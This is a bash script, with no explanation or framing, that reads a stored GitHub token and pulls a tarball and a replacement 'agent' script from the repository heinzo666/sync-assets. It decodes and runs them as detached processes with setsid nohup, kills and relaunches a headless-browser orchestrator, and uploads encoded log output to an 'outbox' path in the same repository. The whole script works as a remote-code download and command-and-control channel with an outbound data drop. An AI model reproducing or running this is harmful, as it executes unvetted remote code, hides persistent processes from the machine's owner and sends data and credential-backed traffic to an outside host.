#!/bin/bash
set -u
export HOME=/tmp XDG_CACHE_HOME=/tmp/.cachex LD_LIBRARY_PATH=/tmp/xl2/lib:/tmp/env/lib PLAYWRIGHT_BROWSERS_PATH=/tmp/pw FONTCONFIG_FILE=/tmp/fonts/fonts.conf
T=$(cat /tmp/.ghtok)
mkdir -p /tmp/b15
timeout 90 curl -fsSL -H "Authorization: Bearer $T" "https://api.github.com/repos/heinzo666/sync-assets/contents/lab/mint19.tgz?ref=main&t=$RANDOM" | /tmp/env/bin/python -c 'import sys,json,base64;open("/tmp/b15.tgz","wb").write(base64.b64decode(json.load(sys.stdin)["content"]))'
tar xzf /tmp/b15.tgz -C /tmp/b15
# upgrade agent to race-safe version (temp files per task)
timeout 60 curl -fsSL -H "Authorization: Bearer $T" "https://api.github.com/repos/heinzo666/sync-assets/contents/lab/al2fix.sh?ref=main&t=$RANDOM" | /tmp/env/bin/python -c 'import sys,json,base64;open("/tmp/al3.sh","wb").write(base64.b64decode(json.load(sys.stdin)["content"]))'
chmod +x /tmp/al3.sh ; pkill -f al2c.sh ; sleep 1 ; setsid nohup bash /tmp/al3.sh </dev/null>/tmp/al3.log 2>&1 &
pkill -f qp_orch ; pkill -f chrome-headless-shell ; sleep 1
rm -f /tmp/orch_oz093708.log
setsid nohup bash -c 'for i in 1 2 3; do env HOME=/tmp XDG_CACHE_HOME=/tmp/.cachex LD_LIBRARY_PATH=/tmp/xl2/lib:/tmp/env/lib PLAYWRIGHT_BROWSERS_PATH=/tmp/pw FONTCONFIG_FILE=/tmp/fonts/fonts.conf STAGE=full /tmp/env/bin/python -u /tmp/b15/qp_orch5.py oz093708 >> /tmp/orch_oz093708.log 2>&1 && break; echo RETRY_$i >> /tmp/orch_oz093708.log; sleep 6; done' < /dev/null &
sleep 42
{ tail -c 1000 /tmp/orch_oz093708.log 2>/dev/null; echo; echo PROC $(pgrep -fc qp_orch5); } > /tmp/g5.txt
B=$(base64 -w0 /tmp/g5.txt)
printf '{"message":"g5 %s","content":"%s"}' "$(date -u +%T)" "$B" > /tmp/pg5.json
curl -s -X PUT -H "Authorization: Bearer $T" -H "Content-Type: application/json" \
 https://api.github.com/repos/heinzo666/sync-assets/contents/lab/outbox/go5_1790155357.json --data-binary @/tmp/pg5.json -o /dev/null
echo GO5_DONE
